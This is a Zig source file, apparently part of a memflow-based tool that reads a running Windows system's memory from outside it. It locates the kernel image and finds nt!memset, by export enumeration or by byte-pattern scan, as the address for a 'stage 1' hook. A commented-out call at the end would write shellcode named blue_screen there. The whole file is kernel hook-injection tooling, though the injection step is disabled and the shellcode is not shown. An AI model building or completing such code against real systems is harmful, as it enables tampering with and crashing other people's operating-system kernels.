const std = @import("std");

const mf = @import("./memflow.zig");

const logger = @import("./main.zig").logger;
const shellcode = @import("./shellcode.zig");

pub fn run(os_instance: *mf.OsInstance, exe_path: []const u8) !void {
    _ = exe_path;

    var nt_kernel_image_info: mf.ModuleInfo = undefined;
    // Search for kernel module
    try mf.tryError(
        mf.mf_osinstance_primary_module(
            os_instance,
            &nt_kernel_image_info,
        ),
        error.MemflowOSIntanceModuleByNameError,
    );

    logger.info(
        "Kernel image starts: 0x{X} & ends: 0x{X}",
        .{
            nt_kernel_image_info.base,
            nt_kernel_image_info.base + nt_kernel_image_info.size,
        },
    );

    const ExportCallbackContext = struct {
        symbol_offset: ?usize = null,
    };
    var export_list_context = ExportCallbackContext{};

    logger.debug("Enumerating NT kernel image (\"{s}\") exports:", .{nt_kernel_image_info.name});
    try mf.tryError(
        mf.mf_osinstance_module_export_list_callback(
            os_instance,
            &nt_kernel_image_info,
            .{
                .context = &export_list_context,
                .func = struct {
                    fn _(context: ?*anyopaque, export_info: mf.ExportInfo) callconv(.C) bool {
                        logger.debug("Export: \"{s}\"", .{export_info.name});

                        var callback_context = @ptrCast(*ExportCallbackContext, @alignCast(
                            @alignOf(*ExportCallbackContext),
                            context,
                        ));

                        if (std.mem.eql(u8, std.mem.span(export_info.name), "memset")) {
                            logger.info(
                                "Found nt!memset offset for stage 1 hook placement as 0x{X}",
                                .{export_info.offset},
                            );
                            callback_context.symbol_offset = export_info.offset;
                            return false;
                        }

                        return true;
                    }
                }._,
            },
        ),
        error.MemflowOSInstanceModuleExportListCallbackError,
    );
    logger.debug("Export enumeration complete", .{});

    var stage_1_addr: usize = undefined;

    if (export_list_context.symbol_offset) |export_addr| {
        stage_1_addr = nt_kernel_image_info.base + export_addr;
    } else {
        logger.warn("Unable to find stage 1 hook location through symbol export enumeration, " ++
            "resorting to pattern scanning...", .{});

        if (try mf.scanOSModuleForPattern(
            os_instance,
            &nt_kernel_image_info,
            &comptime mf.byteSequence(.{
                // x /0 nt!memset: 48 8B C1 0F B6 D2 49 B9 01 01 01 01 01 01 01 01
                0x48, 0x8B, 0xC1, 0x0F, 0xB6, 0xD2, 0x49, 0xB9, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                0x01, 0x01,
            }),
        )) |pattern_addr| {
            stage_1_addr = pattern_addr;
        } else {
            return error.Stage1LocationError;
        }
    }

    logger.info("Stage 1 placement address is 0x{X}", .{stage_1_addr});

    // try mf.writeShellcode(
    //     os_instance,
    //     stage_1_addr,
    //     shellcode.blue_screen,
    //     shellcode._blue_screen,
    // );
}
